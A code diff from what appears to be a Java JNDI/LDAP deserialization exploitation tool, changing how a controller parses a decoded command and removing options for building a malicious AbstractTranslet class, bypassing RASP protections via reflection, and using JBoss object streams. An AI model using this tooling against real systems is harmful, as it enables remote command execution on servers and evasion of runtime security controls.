@@ -108,42 +108,8 @@ public class SerializedDataController implements LdapController {
                     cmd11 = new String(decodedBytes1);
                 }
 
-                if (cmd11.contains("#")) {
-                    String[] cmd11s  = cmd11.split("#");
-                    String[] cmd12s  = cmd11s[1].split(" ");
-                    Options  options = new Options();
-                    options.addOption("a", "AbstractTranslet", false, "恶意类是否继承 AbstractTranslet");
-                    options.addOption("o", "obscure", false, "使用反射绕过");
-                    options.addOption("j", "jboss", false, "Using JBoss ObjectInputStream/ObjectOutputStream");
-                    CommandLineParser parser = new DefaultParser();
-
-                    try {
-                        cmdLine = parser.parse(options, cmd12s);
-                    } catch (Exception e) {
-                        System.out.println("[*] Parameter input error, please use -h for more information");
-                    }
-
-                    params = cmd11s[0];
-                    System.out.println(ansi().render("@|green [+]|@ command：" + cmd11s[0]));
-
-                    if (cmdLine.hasOption("obscure")) {
-                        Config.IS_OBSCURE = true;
-                        System.out.println(ansi().render("@|green [+]|@ 使用反射绕过RASP "));
-                    }
-
-                    if (cmdLine.hasOption("AbstractTranslet")) {
-                        Config.IS_INHERIT_ABSTRACT_TRANSLET = true;
-                        System.out.println("[+] 继承恶意类AbstractTranslet");
-                    }
-
-                    if (cmdLine.hasOption("jboss")) {
-                        Config.IS_JBOSS_OBJECT_INPUT_STREAM = true;
-                    }
-                } else {
-                    params = cmd11;
-                    System.out.println(ansi().render("@|green [+]|@ command：" + cmd11));
-                }
-
+                params = cmd11;
+                System.out.println(ansi().render("@|green [+]|@ command：" + cmd11));
             }
 
         } catch (Exception e) {
